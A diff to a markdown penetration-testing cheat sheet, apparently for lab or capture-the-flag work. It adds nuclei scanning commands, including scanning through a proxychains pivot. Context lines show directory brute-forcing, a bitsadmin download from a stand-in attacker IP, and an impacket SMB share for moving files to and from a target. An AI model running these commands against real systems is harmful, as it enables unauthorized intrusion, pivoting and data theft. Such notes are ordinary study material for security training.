@@ -29,6 +29,17 @@ gobuster -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-
 sudo dirsearch -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.13/ -e all -t 50
 ```
 
+## nuclei
+```
+# Basic commands
+nuclei -u http://10.10.10.13
+nuclei -u http://website.com
+
+# Run this over proxychains to scan a target on another subnet - ie chisel
+proxychains -q nuclei -proxy 'socks5://localhost:1080' -u 172.16.1.19
+```
+
+
 # Network Enumeration 
 ## rustscan
 ```
@@ -94,14 +105,13 @@ bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/nam
 ```
 
 ## smbserver
+Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
 ```
 # Attacker machine
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 
 # Target machine
 net use n: \\192.168.220.133\share /user:test test
-
-Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
 ```
 
 ## RDP Mount
